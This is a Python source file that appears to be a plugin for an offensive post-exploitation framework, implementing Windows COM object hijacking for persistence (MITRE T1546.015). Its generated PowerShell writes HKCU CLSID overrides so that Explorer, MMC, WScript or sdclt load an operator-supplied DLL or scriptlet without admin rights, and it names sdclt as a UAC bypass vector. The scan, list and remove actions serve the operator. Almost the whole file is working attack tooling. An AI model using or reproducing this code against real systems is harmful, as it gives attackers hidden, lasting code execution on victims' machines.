"""
persistence/com_hijack — COM object hijacking. MITRE T1546.015.
Registers a user-space CLSID override in HKCU that redirects a legitimate
COM activation to an operator-controlled DLL/script without admin rights.
Targets CLSIDs that are loaded by common applications (Explorer, MMC, Office).
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


# High-value CLSIDs loaded by common processes (HKCU override = no admin needed)
_CLSID_PRESETS = {
    "sdclt":     ("{F6D90F11-9C73-11D3-B32E-00C04F990BB4}", "sdclt.exe — UAC bypass vector"),
    "mmc":       ("{49B2791A-B1AE-4C90-9B8E-E860BA07F889}", "MMC SnapIn — loaded by mmc.exe"),
    "explorer":  ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "Explorer MRU — loaded at logon"),
    "wscript":   ("{72C24DD5-D70A-438B-8A42-98424B88AFB8}", "WScript.Shell — loaded by scripts"),
    "search":    ("{D3E34B21-9D75-101A-8C3D-00AA001A1652}", "Search band — loaded by Explorer"),
}


class ComHijack(BasePlugin):
    NAME        = "com_hijack"
    DESCRIPTION = "Hijack a COM CLSID in HKCU for code execution at next activation (T1546.015)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1546.015"
    CATEGORY    = "persistence"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="install",
              help="install | remove | list | scan"),
        Param("clsid", str, required=False, default="explorer",
              help="Preset name (sdclt|mmc|explorer|wscript|search) or raw CLSID {GUID}"),
        Param("payload_path", str, required=False, default="",
              help="Path to DLL or script to register as the hijacked server"),
        Param("payload_type", str, required=False, default="dll",
              help="dll | script (wscript) | ps1"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action       = params.get("action", "install").lower()
        clsid_key    = params.get("clsid", "explorer")
        payload_path = params.get("payload_path", "")
        payload_type = params.get("payload_type", "dll").lower()

        # Resolve CLSID
        if clsid_key in _CLSID_PRESETS:
            clsid, desc = _CLSID_PRESETS[clsid_key]
        elif clsid_key.startswith("{") and len(clsid_key) == 38:
            clsid, desc = clsid_key, "custom"
        else:
            return ModuleResult.err(
                f"Unknown CLSID preset. Choose: {' | '.join(_CLSID_PRESETS)} or raw {{GUID}}"
            )

        if action == "list":
            ps = self._ps_list()
        elif action == "scan":
            ps = self._ps_scan()
        elif action == "remove":
            ps = self._ps_remove(clsid)
        elif action == "install":
            if not payload_path:
                return ModuleResult.err("payload_path required for install")
            ps = self._ps_install(clsid, desc, payload_path, payload_type)
        else:
            return ModuleResult.err("action must be: install | remove | list | scan")

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"com_hijack failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="com_hijack")

    @staticmethod
    def _ps_install(clsid: str, desc: str, path: str, ptype: str) -> str:
        reg_base = f"HKCU:\\Software\\Classes\\CLSID\\{clsid}"
        if ptype == "dll":
            server_key  = "InProcServer32"
            server_val  = path
            thread_val  = "Apartment"
            extra_keys  = f"New-ItemProperty -Path '$base\\InProcServer32' -Name 'ThreadingModel' -Value '{thread_val}' -Force | Out-Null"
        elif ptype == "script":
            server_key  = "ScriptletURL"
            server_val  = path
            extra_keys  = ""
        else:  # ps1
            server_key  = "InProcServer32"
            server_val  = f"C:\\Windows\\System32\\scrobj.dll"
            extra_keys  = (
                f"New-Item -Path '$base\\ScriptletURL' -Force | Out-Null\n"
                f"New-ItemProperty -Path '$base\\ScriptletURL' -Name '(Default)' -Value '{path}' -Force | Out-Null"
            )

        return f"""
$base = '{reg_base}'
$results = @("[*] COM Hijack — {clsid} ({desc})")
try {{
    New-Item -Path $base -Force | Out-Null
    New-ItemProperty -Path $base -Name '(Default)' -Value 'Fitnah COM Server' -Force | Out-Null
    New-Item -Path "$base\\{server_key}" -Force | Out-Null
    New-ItemProperty -Path "$base\\{server_key}" -Name '(Default)' -Value '{server_val}' -Force | Out-Null
    {extra_keys}
    $results += "[+] Registered: HKCU\\...\\{clsid}\\{server_key} = {server_val}"
    $results += "[*] Activates when: {desc}"
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_remove(clsid: str) -> str:
        return f"""
$path = "HKCU:\\Software\\Classes\\CLSID\\{clsid}"
if (Test-Path $path) {{
    Remove-Item $path -Recurse -Force
    "[+] Removed COM hijack: {clsid}"
}} else {{
    "[-] Not installed: {clsid}"
}}
""".strip()

    @staticmethod
    def _ps_list() -> str:
        return r"""
$base = "HKCU:\Software\Classes\CLSID"
if (-not (Test-Path $base)) { "[*] No COM hijacks installed"; exit }
$keys = Get-ChildItem $base -ErrorAction SilentlyContinue
if (-not $keys) { "[*] No COM hijacks installed"; exit }
$results = @("[*] Installed COM hijacks:")
foreach ($k in $keys) {
    $srv = Get-ItemProperty "$($k.PSPath)\InProcServer32" -ErrorAction SilentlyContinue
    $val = if ($srv) { $srv.'(default)' } else { "(no InProcServer32)" }
    $results += "  $($k.PSChildName)  =>  $val"
}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_scan() -> str:
        clsids = " ".join(f'"{g}"' for g, _ in _CLSID_PRESETS.values())
        return f"""
$targets = @({clsids})
$results = @("[*] Scanning HKLM CLSID overrides vs HKCU (hijackable CLSIDs):")
foreach ($c in $targets) {{
    $hklm = "HKLM:\\Software\\Classes\\CLSID\\$c"
    $hkcu = "HKCU:\\Software\\Classes\\CLSID\\$c"
    $inHklm  = Test-Path $hklm
    $inHkcu  = Test-Path $hkcu
    $status = if ($inHkcu) {{ "[ACTIVE HIJACK]" }} elseif ($inHklm) {{ "[hijackable]" }} else {{ "[-] not found" }}
    $results += "  $c  $status"
}}
$results -join "`n"
""".strip()
